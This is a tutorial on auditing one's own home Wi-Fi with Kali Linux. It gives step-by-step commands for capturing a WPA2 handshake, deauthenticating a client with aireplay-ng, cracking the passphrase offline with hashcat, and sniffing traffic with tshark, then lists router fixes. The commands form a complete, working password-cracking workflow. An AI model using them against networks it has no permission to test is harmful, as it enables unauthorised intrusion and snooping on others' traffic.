---
title: "Audit the Security of Your Home Wi-Fi Network"
slug: audit-home-wifi-security
description: >-
  Test the real-world strength of your own home Wi-Fi passphrase end-to-end —
  capture a WPA2 handshake with aircrack-ng, crack it offline on a GPU with
  hashcat, inspect wireless traffic with Wireshark, and tighten the router
  configuration based on the findings. Strictly for networks you own.
skills: [aircrack-ng, hashcat, wireshark, kali-linux]
category: devops
tags: [wireless-security, wpa2, home-network, penetration-testing, wifi-audit]
---

# Audit the Security of Your Home Wi-Fi Network

## The Problem

The router ships with a passphrase on a sticker, the family changes it to something memorable six months later, and then nobody ever tests it again. The usual "guidance" — pick a 12-character password with symbols — is abstract. What you actually want to know is: given a modern GPU and rockyou.txt, how long would my current passphrase survive? And while we're in there: is anything on the network broadcasting in the clear, is the guest network isolated, and is WPS still enabled like it was five years ago?

None of those questions can be answered by reading the router admin page. They require capturing a real handshake, running a real crack, and watching real traffic — the same three tasks a hostile neighbor would do. If the crack comes back in 30 seconds, you learned something the sticker couldn't tell you. If the guest network turns out to bridge to your NAS, you find out before someone else does.

## The Solution

On a laptop running Kali Linux with a monitor-mode-capable Wi-Fi adapter, use **aircrack-ng** to capture the 4-way handshake from your own network, convert it to the hashcat `22000` format, then throw a GPU at it with **hashcat** and a realistic wordlist + rules. While the crack runs, use **Wireshark** to audit the unencrypted side of the air: probe requests, mDNS/SSDP chatter, plaintext HTTP, IoT gadgets beaconing their SSIDs. End with a short remediation checklist on the router. The entire audit fits into an evening, leaves no permanent configuration changes on the host, and gives you a crisp answer: is this passphrase strong enough to leave in place for another year?

## Step-by-Step Walkthrough

### Step 1: Prepare a Disposable Kali Environment

The audit tools are all root-privileged and noisy. Run them in a dedicated Kali VM (or a USB live boot), not on your daily OS.

```bash
# Kali VM with a USB Wi-Fi adapter passed through
sudo apt update
sudo apt install -y aircrack-ng hashcat hcxtools wireshark tshark
sudo apt install -y kali-tools-wireless kali-tools-passwords

# Confirm the adapter supports monitor mode + injection
sudo airmon-ng
# PHY   Interface   Driver       Chipset
# phy0  wlan0       ath9k_htc    Atheros AR9271

# Snapshot the VM before starting — you'll restore to this after
# VBoxManage snapshot "Kali" take "pre-wifi-audit-2026-04-11"
```

### Step 2: Capture a Handshake from Your Own AP

```bash
# Kill interfering services and enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Identify your AP — note BSSID and channel
sudo airodump-ng wlan0mon
# AA:BB:CC:DD:EE:FF    -42   103   12  0   6  195  WPA2  CCMP  PSK  MyHomeWifi

# Capture targeted on that channel + BSSID
mkdir -p ~/audit/2026-04-11 && cd ~/audit/2026-04-11
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w home wlan0mon
# Leave this running in a second terminal

# Force a reconnection on one of YOUR OWN devices to produce the handshake
# (toggle Wi-Fi on your phone, or aireplay-ng --deauth with your own client MAC)
sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# airodump header will show "WPA handshake: AA:BB:CC:DD:EE:FF" once captured
# Confirm the capture contains a valid handshake
aircrack-ng home-01.cap | grep 'handshake'
# (1 handshake)
```

### Step 3: Convert and Crack Offline with Hashcat

```bash
# Convert to hashcat 22000 format
hcxpcapngtool -o home.hc22000 home-01.cap
head -c 200 home.hc22000

# GPU crack with rockyou + best64 rules — the realistic neighbor scenario
hashcat -m 22000 home.hc22000 \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --session home-wifi \
  --status --status-timer=30 \
  -w 3

# Retrieve the result
hashcat -m 22000 home.hc22000 --show

# Three possible outcomes, each is useful:
#
#  A) Cracked in seconds/minutes → your passphrase is in rockyou ± a rule.
#     Change it TODAY to a 4-word passphrase or a random 16-char string.
#
#  B) Cracked in hours with a targeted wordlist (street name, birth year)
#     → personalized attacks work. Change it and stop using personal data.
#
#  C) Not cracked after a full rockyou+best64 run → passphrase is probably
#     outside common dictionaries. Still rotate annually.
```

### Step 4: Audit the Air While the Crack Runs

```bash
# Put the adapter back into managed mode for normal capture OR use a second
# adapter. The goal: see what's leaking on the network you just authenticated to.

sudo tshark -i wlan0 -w home-traffic.pcapng -a duration:600 &

# Meanwhile, inspect what you captured
tshark -r home-traffic.pcapng -Y "http.request" \
  -T fields -e ip.src -e http.host -e http.request.uri
# Any plain HTTP here? A printer, an IoT light, an old NAS UI?

# mDNS/SSDP inventory — what devices are announcing themselves?
tshark -r home-traffic.pcapng -Y "mdns or ssdp" \
  -T fields -e ip.src -e dns.qry.name -e ssdp.st | sort -u

# Probe requests from roaming clients — reveals SSIDs other people's devices
# remember (useful signal about how chatty your neighborhood is)
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x04" \
  -T fields -e wlan.sa -e wlan.ssid | sort -u | head

# Open the PCAP in the Wireshark GUI for deeper triage
wireshark home-traffic.pcapng &
```

### Step 5: Remediate and Tear Down

Based on the findings:

| Finding | Action |
|---|---|
| Passphrase cracked in wordlist attack | Change to a 16+ char random passphrase or 4+ word diceware |
| WPS is enabled on the AP | Disable WPS — pixie-dust attacks are trivial |
| Guest network bridges to main VLAN | Re-enable isolation in router settings |
| IoT devices use plaintext HTTP | Move them to an isolated VLAN/SSID |
| Router firmware > 12 months old | Update firmware; enable auto-update |
| WPA2-PSK (not WPA3-SAE) | Switch to WPA3-Personal if all clients support it |

```bash
# Close down the audit cleanly
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager

# Wipe any captured handshake files off the audit VM after you're done
shred -u ~/audit/2026-04-11/home-01.cap

# Restore the snapshot so nothing persists on the Kali VM
# VBoxManage snapshot "Kali" restore "pre-wifi-audit-2026-04-11"
```

## Real-World Example

Priya runs a small consulting business from home with two Wi-Fi networks — the main one for her laptop and a guest SSID for clients who stop by. She's been using the same 10-character passphrase for three years and has never actually tested it. On a Saturday afternoon she boots a Kali live USB, plugs in an AR9271 adapter, and captures the handshake by toggling Wi-Fi on her phone. The `.cap` file converts to `.hc22000` and she runs `hashcat -m 22000` against rockyou with best64 rules on her RTX 4070.

It cracks in 47 seconds. The passphrase was `Priya@2020` — built from her name and the year she moved in. She generates a new 20-character random passphrase, updates both SSIDs, and while she's in the router admin page she disables WPS and switches the main network to WPA3-Personal. A second capture run on the new passphrase chews through 14 billion candidates without a hit and she kills it after an hour, satisfied.

The Wireshark sweep turns up a separate issue: her network-attached printer is announcing itself via SSDP and exposing a plain-HTTP admin page with default credentials. She moves it to the guest SSID where her laptop can still print but nothing else on the main network can reach it. Total time: one evening. Total cost: a $30 adapter. Outcome: one genuinely weak passphrase, one exposed printer, and a printer firmware update scheduled for the following weekend.

## Related Skills

- [aircrack-ng](../skills/aircrack-ng/SKILL.md) — monitor mode, handshake capture, offline cracking
- [hashcat](../skills/hashcat/SKILL.md) — GPU-accelerated WPA2 cracking via mode 22000
- [wireshark](../skills/wireshark/SKILL.md) — traffic and protocol analysis on the captured air
- [kali-linux](../skills/kali-linux/SKILL.md) — disposable lab environment for the audit
- [nmap-recon](../skills/nmap-recon/SKILL.md) — follow-up internal scan of devices on the network
